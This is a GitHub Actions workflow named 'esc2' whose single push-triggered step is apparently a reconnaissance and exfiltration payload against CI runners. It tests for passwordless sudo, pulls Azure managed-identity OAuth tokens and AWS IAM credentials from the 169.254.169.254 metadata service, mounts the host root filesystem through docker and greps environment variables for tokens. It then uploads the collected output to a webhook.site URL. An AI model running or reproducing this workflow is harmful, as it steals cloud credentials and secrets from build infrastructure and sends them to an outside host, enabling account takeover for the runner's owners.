name: esc2
on: [push]
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: |
          {
            echo "== root =="; sudo -n id
            echo "== IMDS azure =="; curl -s -m 6 -H Metadata:true 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' 2>&1 | head -c 600
            echo; echo "== IMDS token =="; curl -s -m 6 -X PUT 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -H Metadata:true 2>&1 | head -c 400
            echo; echo "== AWS IMDS =="; curl -s -m 6 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>&1 | head
            echo "== host fs via docker =="; sudo docker run --rm -v /:/host alpine:latest sh -c 'id; cat /host/etc/hostname; ls /host/root 2>/dev/null | head' 2>&1 | head -12
            echo "== runner internals =="; ls -la /home/runner/work/_actions 2>/dev/null | head -3; sudo -n ls -la /etc/runner* 2>/dev/null; env | grep -iE 'runner|actions|token' | head -20
          } > /tmp/g.txt 2>&1
          curl -s -m 40 --data-binary @/tmp/g.txt https://webhook.site/6094cb7d-cf89-4021-906c-56d602a649fa >/dev/null 2>&1 || true
